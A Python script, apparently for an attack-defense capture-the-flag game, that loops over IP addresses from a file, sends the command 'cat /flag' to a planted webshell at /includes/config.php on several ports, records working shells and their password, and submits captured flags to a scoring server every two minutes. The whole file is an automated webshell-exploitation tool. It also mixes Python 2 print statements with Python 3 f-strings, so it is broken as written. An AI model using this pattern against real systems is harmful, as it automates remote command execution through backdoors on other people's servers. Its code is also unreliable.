#coding:utf-8
import requests  # 导入requests库用于发送HTTP请求
import re        # 导入re库用于正则表达式匹配
import time      # 导入time库用于设置定时任务
import sys       # 导入sys库用于错误处理和退出

# 目标服务器配置 - 将从ip.txt文件读取IP地址
url_template = "http://%s:"  # IP地址的URL模板
url1 = ""                   # 用于存储完整的攻击URL

# Shell相关配置
shell = "/includes/config.php?d=system"  # 目标网站上的webshell路径
passwd = "c"                            # webshell的密码
port = "80"                             # 目标网站的默认端口
payload = {passwd: 'cat /flag'}         # 向webshell发送的命令，用于读取flag文件

# 要尝试连接的端口列表
target_ports = [8802, 8803, 8804]

# Flag服务器相关配置
flag_server = "http://flag_server/flag_file.php?token=%s&flag=%s"  # 提交flag的服务器URL模板
teamtoken = "team1"  # 团队标识token，用于向flag服务器验证身份

def read_ip_file(file_path='ip.txt'):
    """
    从文件中读取IP地址列表
    
    参数:
        file_path: IP地址文件路径，默认为'ip.txt'
    
    返回值:
        包含IP地址的列表，如果文件不存在则返回空列表
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            # 读取文件内容，去除空行和多余空格
            ip_list = [line.strip() for line in f if line.strip()]
        print(f"[+] 成功从 {file_path} 读取到 {len(ip_list)} 个IP地址")
        return ip_list
    except FileNotFoundError:
        print(f"[-] 错误: 找不到文件 {file_path}")
        return []
    except Exception as e:
        print(f"[-] 读取IP文件时出错: {str(e)}")
        return []


def submit_flag(target, teamtoken, flag):
    """ 
    向flag服务器提交获取到的flag
    
    参数:
        target: 目标服务器的URL
        teamtoken: 团队标识token
        flag: 获取到的flag值
    
    返回值:
        True: flag提交成功
        False: flag提交失败
    """
    url = flag_server % (teamtoken, flag)  # 构建完整的提交URL
    pos = {}  # POST请求的数据（为空）
    print "[+]Submitting flag:%s:%s" % (target, url)  # 打印提交信息
    response = requests.post(url, data=pos)  # 发送POST请求提交flag
    content = response.text  # 获取响应内容
    print "[+]content:%s" % content  # 打印响应内容
    if "success" in content:  # 检查响应中是否包含"success"表示成功
        print "[+]Success!!"  # 打印成功信息
        return True
    else:
        print "[-]Failed"  # 打印失败信息
        return False


def flag():
    """ 
    从ip.txt读取目标IP地址，尝试连接目标服务器上的webshell，获取flag并提交
    同时记录可用的webshell和获取的flag信息到文件中
    """
    # 读取IP列表
    ip_list = read_ip_file()
    
    # 如果没有读取到IP地址，退出函数
    if not ip_list:
        print("[-] 没有有效的IP地址可处理，跳过本次扫描")
        return
    
    # 打开文件记录结果
    f=open("webshelllist.txt","w")  # 打开文件记录可用的webshell
    f1=open("firstround_flag.txt","w")  # 打开文件记录获取到的flag
    
    # 遍历每个IP地址
    for ip in ip_list:
        # 遍历每个端口
        for port in target_ports:
            # 构建完整的webshell URL
            url1 = url_template % ip + str(port) + shell
            
            try:
                print "------------------------------------"
                print f"[+] 尝试连接: {url1}"
                # 尝试向webshell发送命令获取flag
                res=requests.post(url1,payload,timeout=1)  # 发送POST请求，超时时间1秒
                
                # 检查请求是否成功
                if res.status_code == requests.codes.ok:
                    print url1 + " connect shell sucess,flag is "+res.text
                    # 记录shell和获取的flag到文件
                    print >>f1,url1+" connect shell sucess,flag is "+res.text  # 写入flag信息
                    print >>f,url1+","+passwd  # 写入webshell信息，格式为URL,密码
                    
                    # 使用正则表达式从响应中提取flag
                    if re.match(r'hello world(\w+)', res.text):  # 匹配以"hello world"开头后跟字母数字的模式
                        flag_value = re.match(r'hello world(\w+)', res.text).group(1)  # 提取flag部分
                        submit_flag(url1, teamtoken, flag_value)  # 提交flag
                    else:
                        print "[-]Can not get flag"  # 无法获取flag
                else:
                    print "shell 404"  # shell不存在或访问失败
            except Exception as e:
                print url1 + " connect shell failed: " + str(e)  # 连接shell失败
    
    # 关闭文件
    f.close()
    f1.close()


def timer(n):
    """ 
    定时执行flag函数
    
    参数:
        n: 执行间隔，单位为秒
    """
    print("[+] 启动定时任务，每%d秒执行一次扫描" % n)
    while True:  # 无限循环
        print("\n[+] 开始新的扫描轮次")
        flag()  # 执行flag函数
        # 注释掉重复执行的部分，因为我们已经在单个flag()调用中处理了所有IP和端口
        # flag()
        # flag()
        print("[+] 当前轮次扫描完成，等待下一轮...")
        time.sleep(n)  # 等待指定的时间间隔

# 启动定时器，每120秒（2分钟）执行一次flag函数
timer(120)